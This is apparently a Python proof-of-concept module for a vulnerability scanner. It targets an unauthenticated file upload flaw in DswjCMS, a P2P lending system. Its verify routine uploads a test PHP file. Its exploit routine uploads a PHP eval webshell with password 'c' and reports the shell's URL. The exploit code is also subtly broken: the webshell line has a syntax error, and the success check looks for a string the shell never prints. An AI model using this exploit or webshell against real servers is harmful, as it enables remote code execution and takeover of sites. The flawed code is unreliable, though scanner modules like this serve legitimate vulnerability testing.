# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'DswjCMS_0001'  # 平台漏洞编号，留空
    name = 'DswjCMS P2P网贷系统 文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-09-17'  # 漏洞公布时间
    desc = '''
        DswjCMS P2P网贷系统前台getshell，任意文件删除漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0141209'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DswjCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '30b85c4e-7c61-4c16-9a13-80f17299a195'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://wooyun.org/bugs/wooyun-2015-0141209
            hh = hackhttp.hackhttp()
            p = urllib.parse.urlparse(self.target)
            raw = """
POST /Public/uploadify/uploadify.php HTTP/1.1
Host: {netloc}
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------32382156818478
Content-Length: 337

-----------------------------32382156818478
Content-Disposition: form-data; name=\"Filedata\"; filename=\"2.php\"
Content-Type: application/octet-stream

<?php
echo \"testvul~test\";
?>
-----------------------------32382156818478
Content-Disposition: form-data; name=\"Button1\"

Button
-----------------------------32382156818478--"""
            code, head, res, errcode, _ = hh.http(
                self.target + '/Public/uploadify/uploadify.php', raw=raw.format(netloc=p.netloc))
            if code == 200 and res:
                file_url = 'http://%s/Public/uploadify/uploads/%s' % (
                    p.netloc, res)
                code, head, res, errcode, _ = hh.http(file_url)
                if 'testvul~test' in res:
                    #security_hole(arg+":Upload File at "+file_url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://wooyun.org/bugs/wooyun-2015-0141209
            hh = hackhttp.hackhttp()
            p = urllib.parse.urlparse(self.target)
            raw = """
POST /Public/uploadify/uploadify.php HTTP/1.1
Host: {netloc}
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------32382156818478
Content-Length: 337

-----------------------------32382156818478
Content-Disposition: form-data; name=\"Filedata\"; filename=\"2.php\"
Content-Type: application/octet-stream

<?php
@eval($_POST[c);
?>
-----------------------------32382156818478
Content-Disposition: form-data; name=\"Button1\"

Button
-----------------------------32382156818478--"""
            code, head, res, errcode, _ = hh.http(
                self.target + '/Public/uploadify/uploadify.php', raw=raw.format(netloc=p.netloc))
            if code == 200 and res:
                file_url = 'http://%s/Public/uploadify/uploads/%s' % (
                    p.netloc, res)
                code, head, res, errcode, _ = hh.http(file_url)
                if 'testvul~test' in res:
                    #security_hole(arg+":Upload File at "+file_url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                        target=self.target, name=self.vuln.name, url=file_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
